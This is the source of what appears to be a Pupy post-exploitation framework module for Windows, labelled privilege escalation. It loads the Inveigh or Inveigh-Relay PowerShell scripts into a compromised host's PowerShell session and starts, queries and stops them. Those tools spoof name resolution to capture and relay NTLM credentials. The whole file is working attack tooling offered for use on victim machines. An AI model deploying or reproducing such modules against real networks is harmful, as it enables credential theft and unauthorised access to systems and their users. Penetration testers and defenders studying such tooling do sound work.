# -*- coding: utf-8 -*-

from pupylib.PupyModule import *

__class_name__="Inveigh"
ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))

@config(compat="windows", category="privesc")
class Inveigh(PupyModule):
    """
        execute Inveigh commands
    """
    dependencies = {
        'windows': [ 'powershell' ]
    }

    known_args = True

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(
            prog="Inveigh", description=self.__doc__
        )

        commands = self.arg_parser.add_subparsers(title='actions')
        start = commands.add_parser('start', help='Start Inveigh')
        subtype = start.add_mutually_exclusive_group()
        subtype.add_argument('-R', '--relay', action='store_true', default=False, help='Start relay')
        start.set_defaults(command='start')
        dump = commands.add_parser('get', help='Get Inveigh results')
        dump.set_defaults(command='dump')
        stop = commands.add_parser('stop', help='Stop Inveigh')
        stop.set_defaults(command='stop')
        info = commands.add_parser('help', help='Get help page from Invoke-Inveigh')
        subinfo = info.add_mutually_exclusive_group()
        info.set_defaults(command='help')
        info.add_argument('-R', '--relay', action='store_true', default=False, help='Help about relay')

    def run(self, args):
        powershell = self.client.conn.modules['powershell']
        script = 'inveigh'
        loaded = True

        if not powershell.loaded(script):
            loaded = False
            if args.command in ('dump', 'stop'):
                self.error('Module is not loaded yet')
                return

            script_file = 'Inveigh-Relay.ps1' if args.relay else 'Inveigh.ps1'

            with open(os.path.join(ROOT, 'external', 'Inveigh', 'Scripts', script_file)) as content:
                width, _ = consize()
                content = content.read()
                if args.relay:
                    content = content.replace('Invoke-InveighRelay', 'Invoke-Inveigh')
                powershell.load(script, content, width=width)

        if args.command == 'start':
            expression = 'Invoke-Inveigh ' + ' '.join(args.unknown_args)
        elif args.command == 'dump':
            expression = 'Get-Inveigh ' + ' '.join(args.unknown_args)
        elif args.command == 'stop':
            expression = 'Stop-Inveigh'
        elif args.command == 'help':
            expression = 'help Invoke-Inveigh ' + ' '.join(args.unknown_args)

        output, rest = powershell.call(script, expression)
        if args.command == 'stop' or ( args.command == 'help' and not loaded ):
            powershell.unload(script)

        if rest:
            self.warning(rest)

        if output:
            self.log(output)
